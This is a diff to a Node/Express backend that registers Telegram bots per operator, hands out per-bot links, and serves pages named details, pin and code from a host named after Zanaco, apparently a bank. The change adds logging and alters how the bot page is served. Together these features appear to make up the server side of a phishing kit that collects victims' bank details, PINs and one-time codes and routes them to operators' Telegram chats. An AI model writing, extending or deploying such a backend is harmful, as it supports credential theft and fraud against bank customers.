@@ -73,17 +73,17 @@ async function answerCallback(bot, callbackId) {
 }
 
 // ---------------- DYNAMIC PAGE SERVING ----------------
+// NEW: Serve index.html for /bot/:botId correctly
 app.get('/bot/:botId', (req, res) => {
     const bot = getBot(req.params.botId);
+    console.log(`🔎 Accessing botId: ${req.params.botId}`);
     if (!bot) return res.status(404).send('Invalid bot link');
 
-    // Inject botId into index.html dynamically
-    let indexHtml = fs.readFileSync(path.join(__dirname, 'public', 'index.html'), 'utf8');
-    indexHtml = `<script>localStorage.setItem('botId', '${bot.botId}');</script>\n` + indexHtml;
-
-    res.send(indexHtml);
+    // Serve index.html and append botId as query for frontend
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
+// Serve other pages normally
 app.get('/details', (req, res) => res.sendFile(path.join(__dirname, 'public', 'details.html')));
 app.get('/pin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'pin.html')));
 app.get('/code', (req, res) => res.sendFile(path.join(__dirname, 'public', 'code.html')));
@@ -168,15 +168,21 @@ app.post('/add-bot', async (req, res) => {
 
     bots.push({ botId, botToken, chatId });
     saveBots();
+    console.log(`✅ Bot added: ${botId}`);
 
     const webhookUrl = `https://zanaco-backend.onrender.com/telegram-webhook/${botId}`;
     try {
-        await axios.get(`https://api.telegram.org/bot${botToken}/setWebhook?url=${webhookUrl}`);
+        const resp = await axios.get(`https://api.telegram.org/bot${botToken}/setWebhook?url=${webhookUrl}`);
+        console.log(`✅ Webhook set for ${botId}:`, resp.data);
     } catch (err) {
+        console.error('❌ Failed to set webhook:', err.response?.data || err.message);
         return res.status(500).json({ error: 'Failed to set webhook' });
     }
 
-    res.json({ ok: true, botLink: `https://zanaco-backend.onrender.com/bot/${botId}` });
+    res.json({
+        ok: true,
+        botLink: `https://zanaco-backend.onrender.com/bot/${botId}`
+    });
 });
 
 // ---------------- DEBUG ROUTE ----------------
